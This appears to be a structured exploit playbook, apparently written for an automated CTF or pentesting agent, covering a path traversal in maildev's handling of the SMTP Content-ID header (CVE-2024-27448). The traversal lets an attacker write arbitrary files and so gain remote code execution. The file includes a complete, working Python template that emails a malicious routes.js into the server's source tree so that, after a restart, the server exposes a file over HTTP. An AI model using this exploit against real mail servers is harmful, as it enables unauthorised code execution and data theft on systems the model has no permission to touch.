---
name: smtp_content_id_path_traversal_rce
vuln_type: path_traversal
sub_technique: smtp_content_id
category: exploitation
safety_level: safe
---

# Smtp Content-Id Path Traversal → Arbitrary File Write → Rce

## When to Apply

A mail server (e.g. maildev) uses the Content-ID header value directly as the filename when saving attachments, with no path sanitization. Inserting `../` sequences in the attachment's Content-ID can overwrite server source code files, and the overwritten code executes on server restart, achieving RCE.

## Prerequisites

- Mail can be sent to the SMTP port (default 1025) without authentication
- Mail server passes Content-ID directly to fs.createWriteStream when saving attachments
- Server source code file path is known or guessable (e.g. /home/node/lib/routes.js)
- Server restarts periodically or a restart can be triggered

## Steps

1. Analyze the mail server's attachment save logic — check `saveAttachment(id, attachment)`
2. Vulnerable if pattern is `fs.createWriteStream(path.join(mailDir, id, attachment.contentId))`
3. Calculate relative path from attachment save directory (`/tmp/maildev-<pid>/<id>/`) to target file:
   - e.g.: `/tmp/maildev-1/<id>/` → `/home/node/lib/routes.js` = `../../../home/node/lib/routes.js`
4. Send email with malicious code in attachment, Content-ID header containing path traversal:
   ```python
   attachment.add_header('Content-ID', '<../../../home/node/lib/routes.js>')
   ```
5. Malicious routes.js content: read flag file + expose via HTTP endpoint
6. Wait for (or trigger) server restart → overwritten code is loaded → access /flag to get the flag

## Code Template

```
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

MALICIOUS_JS = '''
const express = require('express'); const fs = require('fs');
module.exports = function(app, ms, bp) {
  const r = express.Router();
  r.get('/flag', (req,res) => res.send(fs.readFileSync('/flag','utf8')));
  app.use(bp, r);
};
'''

msg = MIMEMultipart('related')
msg['From'] = 'a@evil.com'; msg['To'] = 'v@target.local'
msg['Subject'] = 'x'
msg.attach(MIMEText('<html><body>x</body></html>', 'html'))
att = MIMEBase('application', 'javascript')
att.set_payload(MALICIOUS_JS.encode())
att.add_header('Content-ID', '<../../../home/node/lib/routes.js>')
att.add_header('Content-Disposition', 'inline', filename='routes.js')
msg.attach(att)
with smtplib.SMTP('{host}', {smtp_port}) as s:
    s.sendmail('a@evil.com', ['v@target.local'], msg.as_string())
```

## Examples

### Example 1

- **host**: localhost
- **smtp_port**: 1025
- **web_port**: 1080
- **target_file**: /home/node/lib/routes.js
- **content_id_payload**: ../../../home/node/lib/routes.js
- **flag_path**: /flag

maildev 2.0.x saveAttachment passes Content-ID directly to path.join. After server restart, overwritten routes.js is require'd, achieving RCE. Registered as CVE-2024-27448.
